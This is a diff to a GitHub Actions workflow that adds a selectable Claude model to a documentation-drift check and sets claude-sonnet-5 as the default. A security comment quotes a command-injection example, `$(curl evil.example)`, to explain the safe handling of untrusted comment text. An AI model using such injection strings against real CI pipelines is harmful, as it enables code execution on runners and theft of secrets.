@@ -34,13 +34,27 @@ on:
           - claude
           - analysis-pipeline
           - dashboard-output-formats
+      model:
+        description: 'Which Claude model to run the check with'
+        required: false
+        type: choice
+        default: claude-sonnet-5
+        options:
+          - claude-sonnet-5
+          - claude-opus-4-8
+          - claude-haiku-4-5-20251001
 
 permissions:
   pull-requests: write
   issues: write
 
 env:
-  DOC_DRIFT_MODEL: claude-haiku-4-5-20251001
+  # Default model for both trigger paths — the comment path always uses this; workflow_dispatch
+  # lets the caller override via the `model` input (see the dispatch job's parse step). Verified
+  # empirically: claude-haiku-4-5-20251001 produced a false-positive MAJOR security finding
+  # (claimed JWT issuer/audience validation wasn't enforced when Program.cs clearly enforces it)
+  # that two independent claude-sonnet-5 runs didn't — keep sonnet-5 as the default floor.
+  DOC_DRIFT_MODEL: claude-sonnet-5
 
 jobs:
   # Parses the triggering comment and resolves which doc(s) to check. Every downstream job
@@ -59,24 +73,27 @@ jobs:
       doc: ${{ steps.parse.outputs.doc }}
       pr_number: ${{ steps.parse.outputs.pr_number }}
       pr_ref: ${{ steps.pr.outputs.ref }}
+      model: ${{ steps.parse.outputs.model }}
     steps:
       # SECURITY: the comment body (and, on the workflow_dispatch path, the free-text inputs)
       # is untrusted, attacker-controllable text. It MUST be passed through an env var (never
       # spliced directly via ${{ }} into a `run:` script) — otherwise a crafted comment like
       # `$(curl evil.example)` would execute inside the runner. Passing it as $COMMENT_BODY
       # and only ever using it inside quoted expansions (never eval'd) keeps this safe.
-      - name: Parse requested doc + PR number
+      - name: Parse requested doc + PR number + model
         id: parse
         env:
           COMMENT_BODY: ${{ github.event.comment.body }}
           DISPATCH_DOC: ${{ github.event.inputs.doc }}
           DISPATCH_PR: ${{ github.event.inputs.pr_number }}
+          DISPATCH_MODEL: ${{ github.event.inputs.model }}
         run: |
           if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            # workflow_dispatch's `doc` is a fixed dropdown (type: choice) — always one of the
-            # known values, no validation needed. `pr_number` is a plain number input.
+            # workflow_dispatch's `doc` and `model` are fixed dropdowns (type: choice) — always
+            # one of the known values, no validation needed. `pr_number` is a plain number input.
             DOC="${DISPATCH_DOC:-all}"
             PR_NUMBER="$DISPATCH_PR"
+            MODEL="${DISPATCH_MODEL:-$DOC_DRIFT_MODEL}"
           else
             ARG=$(printf '%s\n' "$COMMENT_BODY" | head -n1 | sed -E 's#^/check-doc-drift[[:space:]]*##' | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
             case "$ARG" in
@@ -88,9 +105,12 @@ jobs:
               *) DOC="invalid" ;;
             esac
             PR_NUMBER="${{ github.event.issue.number }}"
+            # Comment path has no per-invocation model choice — always the workflow default.
+            MODEL="$DOC_DRIFT_MODEL"
           fi
           echo "doc=$DOC" >> "$GITHUB_OUTPUT"
           echo "pr_number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
+          echo "model=$MODEL" >> "$GITHUB_OUTPUT"
 
       - name: Resolve PR head ref
         id: pr
@@ -132,6 +152,9 @@ jobs:
       - name: Check docs/authentication.md drift vs code (advisory)
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Overrides the workflow-level default with whatever `dispatch` resolved — either the
+          # workflow_dispatch `model` input, or the fixed default on the comment-trigger path.
+          DOC_DRIFT_MODEL: ${{ needs.dispatch.outputs.model }}
         run: |
           set -eo pipefail
 
@@ -286,6 +309,9 @@ jobs:
       - name: Check CLAUDE.md drift vs code (advisory)
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Overrides the workflow-level default with whatever `dispatch` resolved — either the
+          # workflow_dispatch `model` input, or the fixed default on the comment-trigger path.
+          DOC_DRIFT_MODEL: ${{ needs.dispatch.outputs.model }}
         run: |
           set -eo pipefail
 
@@ -459,6 +485,9 @@ jobs:
       - name: Check docs/analysis-pipeline.md drift vs code (advisory)
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Overrides the workflow-level default with whatever `dispatch` resolved — either the
+          # workflow_dispatch `model` input, or the fixed default on the comment-trigger path.
+          DOC_DRIFT_MODEL: ${{ needs.dispatch.outputs.model }}
         run: |
           set -eo pipefail
 
@@ -607,6 +636,9 @@ jobs:
       - name: Check docs/dashboard-output-formats.md drift vs code (advisory)
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Overrides the workflow-level default with whatever `dispatch` resolved — either the
+          # workflow_dispatch `model` input, or the fixed default on the comment-trigger path.
+          DOC_DRIFT_MODEL: ${{ needs.dispatch.outputs.model }}
         run: |
           set -eo pipefail
 
